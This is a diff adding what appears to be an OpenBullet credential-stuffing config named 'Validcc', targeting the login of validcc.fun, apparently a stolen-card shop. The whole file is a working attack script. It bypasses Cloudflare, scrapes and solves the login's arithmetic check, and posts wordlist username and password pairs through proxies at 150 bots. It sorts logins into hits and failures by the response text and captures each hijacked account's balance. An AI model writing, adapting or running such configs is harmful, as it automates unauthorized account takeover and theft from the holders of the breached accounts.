@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Validcc",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-03T08:13:41.5179231+07:00",
+  "AdditionalInfo": "",
+  "Author": "Onyx:Garfield#7189",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BYPASSCF "https://validcc.fun/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+#Onyx:Garfield7189 REQUEST GET "https://validcc.fun/login.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+#Onyx:Garfield7189 PARSE "<SOURCE>" LR "var answer=\"" "\"" -> VAR "TOKEN" 
+#Onyx:Garfield7189 PARSE "<SOURCE>" LR "How much is " "?" -> VAR "QUESTION" 
+#Onyx:Garfield7189 FUNCTION Compute "<QUESTION>" -> VAR "ANSWER" 
+#Onyx:Garfield7189 REQUEST POST "https://validcc.fun/ajax/login.php?type=login" AutoRedirect=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&question=<ANSWER>&answer=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://validcc.fun" 
+  HEADER "Referer: https://validcc.fun/login.php" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+#Onyx:Garfield7189 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Username or password are invalid" 
+    KEY "Please fill in all fields" 
+  KEYCHAIN Success OR 
+    KEY "Login Successful" 
+#Onyx:Garfield7189 REQUEST GET "https://validcc.fun/index.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://validcc.fun/login.php" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+#Onyx:Garfield7189 PARSE "<SOURCE>" LR "<span class=\"h2 mb-0\">" "<" Recursive=TRUE -> VAR "123" 
+#Onyx:Garfield7189 FUNCTION Constant "<123#3>" -> CAP "Balance" 
